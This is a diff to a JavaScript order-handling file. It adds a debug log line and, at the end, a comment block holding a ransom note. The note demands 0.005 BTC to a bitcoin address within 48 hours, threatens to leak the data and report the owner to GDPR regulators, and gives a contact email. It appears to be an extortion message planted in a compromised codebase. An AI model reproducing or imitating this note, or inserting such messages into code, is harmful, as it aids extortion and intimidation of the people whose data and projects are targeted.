@@ -183,6 +183,7 @@ function setShop(shopList = []) {
  * @param {Object} desc 
  */
 function addOreder(desc = {}, callback) {
+  console.log(desc)
   api.addOrder(desc, (err, res) => {
     callback(err, res);
     if (res.data) {
@@ -201,3 +202,7 @@ function addOreder(desc = {}, callback) {
     }
   })
 }
+
+/**
+ * All your data is a backed up. You must pay 0.005 BTC to 1KkJyEcFKPo5jon3VzJUrWy4Px22RkZz9A 48 hours for recover it. After 48 hours expiration we will leaked and exposed all your data. In case of refusal to pay, we will contact the General Data Protection Regulation, GDPR and notify them that you store user data in an open form and is not safe. Under the rules of the law, you face a heavy fine or arrest and your base dump will be dropped from our server! You can buy bitcoin here, does not take much time to buy https://localbitcoins.com with this guide https://localbitcoins.com/guides/how-to-buy-bitcoins After paying write to me in the mail with your DB IP: recoverybase@cock.li
+ */
